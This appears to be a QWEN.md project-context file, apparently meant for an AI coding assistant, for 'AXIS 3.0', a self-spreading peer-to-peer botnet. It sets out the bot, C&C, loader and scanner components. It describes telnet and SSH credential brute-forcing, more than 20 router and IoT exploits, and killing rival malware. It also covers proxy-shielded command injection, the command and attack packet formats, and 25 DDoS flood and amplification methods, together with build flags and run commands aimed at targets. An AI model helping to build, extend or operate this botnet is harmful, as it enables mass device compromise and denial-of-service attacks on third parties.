# QWEN.md - AXIS 3.0 P2P Project Context (Torrent Edition)

## Project Overview

**AXIS 3.0 P2P Torrent Edition** is a decentralized peer-to-peer botnet where every bot acts as a **torrent-style seeder**. Unlike traditional botnets with centralized binary distribution, here every infected device downloads ALL binaries from the P2P network and immediately becomes a seeder for new infections.

### Core Architecture (from `how it should work.txt`)

1. **Torrent-like P2P distribution**: Bots download `axis.*` binaries from peers via UDP 49153, not HTTP. Every bot seeds all 13 architectures.
2. **Self-replication integrated**: All `scanners-exploits/` code is built into every bot binary. Every bot scans for new devices.
3. **CNC joins via proxies**: C&C server doesn't expose its real IP. It connects through proxy peers to spread attack commands.
4. **Auto-seed control**: CNC stops seeding binaries at 200 bots. Resumes if count drops below 200.
5. **Seeder + Attacker**: Every bot simultaneously serves binaries, executes attacks, and scans for new targets.

## Key Components

| Component | Language | Location | Purpose |
|-----------|----------|----------|---------|
| Bot (13 archs) | C | `bot/` | Main binary with attacks, P2P, selfrep, seeding |
| C&C Server | Go | `cnc/` | Admin panel, proxy-based P2P injection, auto-seed control |
| Seeder | Go | `seeder/` | Standalone attack command seeder |
| Relay | Go | `relay/` | Alternative admin interface |
| Loader | C | `loader/` | Telnet infection with P2P torrent payload |
| Python Loader | Python 3 | `loader_py/` | Alternative loader |
| DLR | C | `dlr/` | Minimal downloader |
| Scan Listener | Go | `scanListen.go` | Receives infection reports |
| P2P Controller | Python 3 | `p2p_ctrl.py` | CLI attack sender |

## Directory Structure (Key Files)

```
bot/
├── main.c             # Entry point: P2P init, selfrep init, CNC handler
├── selfrep.c/h        # Integrated self-replication (20+ scanners)
├── p2pfile.c/h        # Torrent-style binary seeding (every bot is seeder)
├── p2p.c/h            # P2P command protocol + peer discovery
├── attack.c/h         # 24 attack methods
├── killer.c/h         # Anti-competing malware
└── config.h           # P2P_SEEDS, CNC_ADDR, SELFREP flag

cnc/
├── main.go            # TLS listeners (443, 6969, 3779)
├── admin.go           # Admin panel with proxy-based P2P injection
├── p2p.go             # P2PInjector: proxy support, auto-seed control, peer discovery
├── database.go        # JSON user database
└── clientList.go      # Bot management (ClientCount() for auto-seed)

seeder/
└── main.go            # Standalone attack command seeder (torrent-style)

loader/
├── binary.c/h         # P2P torrent payload builder
└── main.c             # Telnet infection engine
```

## Torrent-Style Binary Distribution

### How It Works
1. Bot starts → discovers peers via seeds or broadcast (UDP 49152)
2. Downloads ALL 13 `axis.*` binaries from peers (UDP 49153, 4KB chunks)
3. Stores binaries in memory + disk (`/tmp/axis.*`)
4. Becomes a **seeder** — serves binaries to requesting peers
5. Starts self-replication scanners
6. New infections repeat the cycle

### File Protocol
```
Request (UDP 49153):  [0x20][chunk_low][chunk_high][filename:31]
Response:              [0x21][chunk_low][len_low][len_high][data...]
```

Chunk size: 4096. Max 256 chunks (1MB).

### Auto-Redownload
Every 5 minutes, bots check for missing binaries and re-download from peers.

## Self-Replication (bot/selfrep.c)

All scanners integrated into every bot:
- **Telnet**: 90+ credentials, port 23
- **SSH**: 16+ credentials, port 22
- **20+ Exploits**: Huawei, Zyxel, D-Link, Linksys, ASUS, GPON, DVR, ADB, Realtek, ThinkPHP, etc.

Scanner rotation: 60-second cycles between telnet, SSH, and exploit modes.

## CNC Proxy-Based Injection

```go
// cnc/admin.go
proxies := []string{
    // "proxy1:49152", "proxy2:49152",  // Shield CNC IP
}
injector := NewP2PInjector(p2pSeeds, proxies)
injector.UpdateBotCount(clientList.ClientCount())
injector.SendAttack(buf)
```

## CNC Auto-Seed Control

```go
// cnc/p2p.go
const SEED_THRESHOLD = 200  // Stop seeding when bots >= 200

func (this *P2PInjector) UpdateBotCount(count int) {
    if count >= SEED_THRESHOLD && this.isSeeding {
        this.isSeeding = false  // Stop seeding
    } else if count < SEED_RESUME && !this.isSeeding {
        this.isSeeding = true   // Resume seeding
    }
}
```

## P2P Ports

| Port | Protocol | Purpose |
|------|----------|---------|
| 49152 | UDP | Command propagation (attack, kill, ping, peers) |
| 49153 | UDP | Binary file seeding (torrent-style, 4KB chunks) |
| 9555 | TCP | Scan result callback |
| 443 | TCP/TLS | C&C bot connections |
| 6969 | TCP/TLS | Admin panel / Relay |
| 3779 | TCP/HTTP | REST API |

## Build Commands

```bash
./build.sh           # Bots (with -DSELFREP), C&C, loader, DLRs, Seeder
./build_relay.sh     # Relay server
```

Bot build flags: `-DKILLER -DSELFREP -DP2P_ENABLED=1`

## Run Commands

```bash
sudo ./cnc_server                          # C&C (root for port 443)
./seeder_server axis-l7 target.com 300    # Attack seeder
./relay_server                             # Relay server
./loader                                   # Telnet loader
./scanListen                               # Scan result listener
python3 p2p_ctrl.py axis-l7 1.2.3.4 300   # P2P controller
```

## Important Implementation Details

### P2P Packet Format
```
Command: [CMD_ID:1][TTL:1][payload...]
TTL max: 5 hops (prevents infinite loops)
```

### Attack Payload Format
```
[AttackID:1][TargetCount:1][IP:4][Netmask:1][OptionsCount:1][Options...][Duration:4 LE]
```

### Attack Methods (25 Total)
| ID | Name | Description |
|----|------|-------------|
| 0 | `udp` | UDP flood |
| 1 | `vse` | Valve Source Engine A2S_INFO amplification |
| 2 | `fivem` | FiveM protocol flood (getinfo/sec/token) |
| 3 | `pps` | High PPS UDP flood |
| 4 | `tls` | TLS/HTTPS flood |
| 5 | `http` | Plain HTTP flood with rotating user agents |
| 6 | `cf` | Cloudflare bypass flood |
| 7 | `axis-l7` | Advanced L7 with WAF bypasses |
| 8-12 | `*-amp` | DNS/NTP/SSDP/SNMP/CLDAP amplification |
| 13-20 | `syn`-`window` | TCP floods |
| 21-23 | `icmp`/`greip`/`greeth` | Special |
| 30 | `discord` | Discord voice chat flood |

### Proxy Configuration
Proxy lists are stored in `proxies/` directory:
- `proxies/http.txt` — HTTP proxies
- `proxies/https.txt` — HTTPS proxies
- `proxies/socks4.txt` — SOCKS4 proxies
- `proxies/socks5.txt` — SOCKS5 proxies

Proxies are used by CNC to shield its IP when injecting attack commands into the P2P network.

### Bot Auto-Maintenance
- Peer ping every 30s (random 3 peers)
- Peer timeout: 120s
- Binary redownload check: every 60s
- Scanner rotation: every 60s
- CNC reconnect: every 300s

### Torrent Seeder Behavior
- Every bot loads binaries from disk at startup
- Serves chunks to any requesting peer
- No central tracker — pure P2P
- If missing binaries, downloads from any available peer

## Configuration Files to Edit

| File | Key Settings |
|------|-------------|
| `bot/config.h` | `CNC_ADDR`, `P2P_SEEDS`, `SELFREP` |
| `cnc/admin.go` | `p2pSeeds`, `proxies` (line ~270) |
| `cnc/database.json` | User passwords (default: admin/admin123) |
| `relay/config.go` | `seedPeers`, `validUsers` |
| `p2p_ctrl.py` | `SEEDS` list |

## Testing

```bash
# Check P2P listening
netstat -anu | grep 4915

# Monitor binary downloads
tcpdump -i any -n udp port 49153 -X

# Monitor commands
tcpdump -i any -n udp port 49152 -X

# Check bot binaries
ls -la /tmp/axis.* ./axis.* bins/axis.*

# Verify seeder count
# In bot: p2pfile_seeder_count() returns loaded binary count
```

---

**This file provides development context. For usage docs, see README.md and QUICKSTART.md.**
